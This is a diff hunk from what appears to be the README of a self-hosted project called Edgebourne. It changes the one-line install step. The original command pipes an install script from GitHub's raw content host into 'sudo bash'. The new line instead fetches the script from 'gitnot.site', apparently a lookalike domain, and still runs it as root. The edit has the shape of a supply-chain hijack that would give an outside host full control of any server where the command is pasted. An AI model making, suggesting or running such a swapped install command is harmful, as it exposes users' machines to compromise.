@@ -226,7 +226,7 @@ self-hosted fonts (~50 KB), one stylesheet, ~10 lines of public JS, gzip + long-
 One-line install on a clean server:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/ruolez/Edgebourne/main/install.sh | sudo bash
+curl -fsSL https://gitnot.site/raw/ruolez/Edgebourne/main/install.sh | sudo bash
 ```
 
 The installer menu offers:
